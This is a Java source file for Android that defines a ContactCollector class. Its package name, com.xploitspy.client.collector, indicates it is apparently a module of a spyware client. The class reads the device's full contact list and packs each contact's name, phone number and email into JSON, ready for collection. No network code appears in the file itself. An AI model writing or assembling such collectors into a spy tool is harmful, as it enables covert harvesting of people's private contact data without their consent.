package com.xploitspy.client.collector;

import android.content.Context;
import android.database.Cursor;
import android.provider.ContactsContract;
import android.util.Log;
import org.json.JSONArray;
import org.json.JSONObject;

/**
 * ContactCollector - Mengumpulkan data Contacts
 */
public class ContactCollector {
    
    private static final String TAG = "ContactCollector";
    private Context context;
    
    public ContactCollector(Context context) {
        this.context = context;
    }
    
    public JSONArray collect() {
        JSONArray contacts = new JSONArray();
        
        try {
            String[] projection = {
                ContactsContract.Contacts._ID,
                ContactsContract.Contacts.DISPLAY_NAME
            };
            
            Cursor cursor = context.getContentResolver().query(
                ContactsContract.Contacts.CONTENT_URI,
                projection,
                null,
                null,
                ContactsContract.Contacts.DISPLAY_NAME + " ASC"
            );
            
            if (cursor != null) {
                while (cursor.moveToNext()) {
                    String contactId = cursor.getString(0);
                    String name = cursor.getString(1);
                    
                    JSONObject contact = new JSONObject();
                    contact.put("name", name);
                    contact.put("phoneNumber", getPhoneNumber(contactId));
                    contact.put("email", getEmail(contactId));
                    
                    contacts.put(contact);
                }
                cursor.close();
            }
        } catch (Exception e) {
            Log.e(TAG, "Error collecting contacts", e);
        }
        
        return contacts;
    }
    
    private String getPhoneNumber(String contactId) {
        try {
            Cursor phoneCursor = context.getContentResolver().query(
                ContactsContract.CommonDataKinds.Phone.CONTENT_URI,
                new String[]{ContactsContract.CommonDataKinds.Phone.NUMBER},
                ContactsContract.CommonDataKinds.Phone.CONTACT_ID + " = ?",
                new String[]{contactId},
                null
            );
            
            if (phoneCursor != null && phoneCursor.moveToFirst()) {
                String number = phoneCursor.getString(0);
                phoneCursor.close();
                return number;
            }
        } catch (Exception e) {
            Log.e(TAG, "Error getting phone number", e);
        }
        return "";
    }
    
    private String getEmail(String contactId) {
        try {
            Cursor emailCursor = context.getContentResolver().query(
                ContactsContract.CommonDataKinds.Email.CONTENT_URI,
                new String[]{ContactsContract.CommonDataKinds.Email.DATA},
                ContactsContract.CommonDataKinds.Email.CONTACT_ID + " = ?",
                new String[]{contactId},
                null
            );
            
            if (emailCursor != null && emailCursor.moveToFirst()) {
                String email = emailCursor.getString(0);
                emailCursor.close();
                return email;
            }
        } catch (Exception e) {
            Log.e(TAG, "Error getting email", e);
        }
        return "";
    }
}

